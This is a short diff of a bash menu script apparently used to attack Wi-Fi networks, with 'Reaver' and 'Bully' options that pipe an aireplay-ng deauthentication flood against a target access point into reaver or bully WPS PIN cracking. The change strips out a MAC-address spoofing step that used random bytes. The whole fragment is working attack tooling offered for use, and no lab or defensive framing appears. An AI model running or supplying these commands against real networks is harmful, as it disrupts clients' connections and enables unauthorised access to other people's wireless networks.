@@ -31,10 +31,10 @@ do
     case $opt in
         "Reaver")
             echo "Reaver Attack Launching"
-          ifconfig $interface hw ether $(printf '02:%02X:%02X:%02X:%02X:%02X \n' $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256]) | aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 | reaver -i $interface -b $tmac -c $channel -vv -K -JSLw;;
+          aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 | reaver -i $interface -b $tmac -c $channel -vv -K -JSLw;;
         "Bully")
             echo "Bully Attack Launching"
-          ifconfig $interface hw ether $(printf '02:%02X:%02X:%02X:%02X:%02X \n' $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256] $[RANDOM%256]) | aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 |  bully $interface -b $tmac -e $bname -c$channel -dBW -v 3;;
+         aireplay-ng -0 300 -a $tmac -c $interface >> /dev/null 2>&1 |  bully $interface -b $tmac -e $bname -c$channel -dBW -v 3;;
         "Quit")
             break
             ;;
